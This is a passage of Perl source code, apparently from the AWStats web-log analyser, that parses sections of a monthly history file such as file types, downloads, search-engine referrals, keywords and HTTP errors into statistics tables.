{\n\t\t\t\t\t\t\t\t\t$_url_x{ $field[0] } += $field[4];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SIDER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SIDER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SIDER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SIDER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SIDER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SIDER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'sider'};\n\n# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR\n#if ($SectionsToSave{'sider'}) {\n#\tSave_History('sider',$year,$month,$date); delete $SectionsToSave{'sider'};\n#\tif ($withpurge) { %_url_p=(); %_url_k=(); %_url_e=(); %_url_x=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_FILETYPES\n\t\t\tif ( $field[0] eq 'BEGIN_FILETYPES' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of FILETYPES section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'filetypes'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_filetypes_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_filetypes_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_filetypes_gz_in{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t$_filetypes_gz_out{ $field[0] } += $field[4];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_FILETYPES'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_FILETYPES\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_FILETYPES'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_FILETYPES\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section FILETYPES not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of FILETYPES section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'filetypes'};\n\t\t\t\tif ( $SectionsToSave{'filetypes'} ) {\n\t\t\t\t\tSave_History( 'filetypes', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'filetypes'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_filetypes_h      = ();\n\t\t\t\t\t\t%_filetypes_k      = ();\n\t\t\t\t\t\t%_filetypes_gz_in  = ();\n\t\t\t\t\t\t%_filetypes_gz_out = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_DOWNLOADS\n\t\t\tif ( $field[0] eq 'BEGIN_DOWNLOADS' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\" Begin of DOWNLOADS section\");\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $counttoload = int($field[1]);\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'downloads'}) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t$_downloads{$field[0]}->{'AWSTATS_HITS'} += int( $field[1] );\n\t\t\t\t\t\t\t$_downloads{$field[0]}->{'AWSTATS_206'} += int( $field[2] );\n\t\t\t\t\t\t\t$_downloads{$field[0]}->{'AWSTATS_SIZE'} += int( $field[3] );\t\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_DOWNLOADS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_DOWNLOADS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_DOWNLOADS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_DOWNLOADS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section DOWNLOADS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of DOWNLOADS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'downloads'};\n\t\t\t\tif ( $SectionsToSave{'downloads'} ) {\n\t\t\t\t\tSave_History( 'downloads',\n\t\t\t\t\t\t$year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'downloads'};\n\t\t\t\t\tif ($withpurge) { %_downloads = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SEREFERRALS\n\t\t\tif ( $field[0] eq 'BEGIN_SEREFERRALS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SEREFERRALS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'sereferrals'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $versionnum < 5004 )\n\t\t\t\t\t\t\t{    # For history files < 5.4\n\t\t\t\t\t\t\t\tmy $se = $field[0];\n\t\t\t\t\t\t\t\t$se =~ s/\\./\\\\./g;\n\t\t\t\t\t\t\t\tif ( $SearchEnginesHashID{$se} ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $SearchEnginesHashID{$se}\n\t\t\t\t\t\t\t\t\t  } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $field[0] } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $versionnum < 5091 )\n\t\t\t\t\t\t\t{    # For history files < 5.91\n\t\t\t\t\t\t\t\tmy $se = $field[0];\n\t\t\t\t\t\t\t\t$se =~ s/\\./\\\\./g;\n\t\t\t\t\t\t\t\tif ( $SearchEnginesHashID{$se} ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{ $SearchEnginesHashID{$se}\n\t\t\t\t\t\t\t\t\t  } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $SearchEnginesHashID{$se}\n\t\t\t\t\t\t\t\t\t  } += $field[2]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{ $field[0] } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $field[0] } += $field[2]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SEREFERRALS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SEREFERRALS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SEREFERRALS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SEREFERRALS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SEREFERRALS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SEREFERRALS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'sereferrals'};\n\t\t\t\tif ( $SectionsToSave{'sereferrals'} ) {\n\t\t\t\t\tSave_History( 'sereferrals', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'sereferrals'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_se_referrals_p = ();\n\t\t\t\t\t\t%_se_referrals_h = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_PAGEREFS\n\t\t\tif ( $field[0] eq 'BEGIN_PAGEREFS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of PAGEREFS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'pagerefs'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t!$FilterIn{'refererpages'}\n\t\t\t\t\t\t\t\t\t\t|| $field[0] =~\n\t\t\t\t\t\t\t\t\t\t/$FilterIn{'refererpages'}/\n\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'refererpages'}\n\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t/$FilterEx{'refererpages'}/ )\n\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $versionnum < 5004 )\n\t\t\t\t\t\t\t\t{    # For history files < 5.4\n\t\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[0] } +=\n\t\t\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_p{ $field[0] } +=\n\t\t\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[0] } +=\n\t\t\t\t\t\t\t\t\t\t  int( $field[2] );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_PAGEREFS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_PAGEREFS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_PAGEREFS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_PAGEREFS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section PAGEREFS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of PAGEREFS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'pagerefs'};\n\t\t\t\tif ( $SectionsToSave{'pagerefs'} ) {\n\t\t\t\t\tSave_History( 'pagerefs', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'pagerefs'};\n\t\t\t\t\tif ($withpurge) { %_pagesrefs_p = (); %_pagesrefs_h = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SEARCHWORDS\n\t\t\tif ( $field[0] eq 'BEGIN_SEARCHWORDS' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" Begin of SEARCHWORDS section ($MaxNbOf{'KeyphrasesShown'},$MinHit{'Keyphrase'})\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'searchwords'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $HTMLOutput{'main'} ) {\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif ( $countloaded <\n\t\t\t\t\t\t\t\t\t\t\t   $MaxNbOf{'KeyphrasesShown'}\n\t\t\t\t\t\t\t\t\t\t\t&& $field[1] >=\n\t\t\t\t\t\t\t\t\t\t\t$MinHit{'Keyphrase'} )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentKeyphrases++;\n\t\t\t\t\t\t\t\t\t\t$TotalKeyphrases += ( $field[1] || 0 );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telsif ( $HTMLOutput{'keyphrases'} )\n\t\t\t\t\t\t\t\t{    # Load keyphrases for keyphrases chart\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif ( $field[1] >= $MinHit{'Keyphrase'} )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentKeyphrases++;\n\t\t\t\t\t\t\t\t\t\t$TotalKeyphrases += ( $field[1] || 0 );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $HTMLOutput{'keywords'} )\n\t\t\t\t\t\t\t\t{    # Load keyphrases for keywords chart\n\t\t\t\t\t\t\t\t\t$loadrecord = 2;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\tif ( $loadrecord == 2 ) {\n\t\t\t\t\t\t\t\t\t\tforeach ( split( /\\+/, $field[0] ) )\n\t\t\t\t\t\t\t\t\t\t{    # field[0] is \"val1+val2+...\"\n\t\t\t\t\t\t\t\t\t\t\t$_keywords{$_} += $field[1];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t$_keyphrases{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SEARCHWORDS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SEARCHWORDS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SEARCHWORDS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SEARCHWORDS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SEARCHWORDS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SEARCHWORDS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'searchwords'};\n\t\t\t\tif ( $SectionsToSave{'searchwords'} ) {\n\t\t\t\t\tSave_History( 'searchwords', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{ 'searchwords'\n\t\t\t\t\t  };    # This save searwords and keywords sections\n\t\t\t\t\tif ($withpurge) { %_keyphrases = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_KEYWORDS\n\t\t\tif ( $field[0] eq 'BEGIN_KEYWORDS' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" Begin of KEYWORDS section ($MaxNbOf{'KeywordsShown'},$MinHit{'Keyword'})\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'keywords'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) { $loadrecord = 1; }\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif (   $countloaded < $MaxNbOf{'KeywordsShown'}\n\t\t\t\t\t\t\t\t\t&& $field[1] >= $MinHit{'Keyword'} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$TotalDifferentKeywords++;\n\t\t\t\t\t\t\t\t$TotalKeywords += ( $field[1] || 0 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_keywords{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_KEYWORDS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_KEYWORDS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_KEYWORDS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_KEYWORDS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section KEYWORDS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of KEYWORDS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'keywords'};\n\t\t\t\tif ( $SectionsToSave{'keywords'} ) {\n\t\t\t\t\tSave_History( 'keywords', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'keywords'};\n\t\t\t\t\tif ($withpurge) { %_keywords = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_ERRORS\n\t\t\tif ( $field[0] eq 'BEGIN_ERRORS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of ERRORS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'errors'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_errors_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_errors_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_ERRORS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_ERRORS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_ERRORS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_ERRORS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section ERRORS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of ERRORS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'errors'};\n\t\t\t\tif ( $SectionsToSave{'errors'} ) {\n\t\t\t\t\tSave_History( 'errors', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'errors'};\n\t\t\t\t\tif ($withpurge) { %_errors_h = (); %_errors_k = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SIDER_xxx\n\t\t\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\t\tif ( $field[0] eq \"BEGIN_SIDER_$code\" ) {\n\t\t\t\t\tif ($Debug) { debug(\" Begin of SIDER_$code section\"); }\n\t\t\t\t\t$field[0] = '';\n\t\t\t\t\tmy $count       = 0;\n\t\t\t\t\tmy $countloaded = 0;\n\t\t\t\t\tdo {\n\t\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t\t$count++;\n\t\t\t\t\t\t\tif ( $SectionsToLoad{\"sider_$code\"} ) {\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_sider_h{$code}{$field[0]} += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( 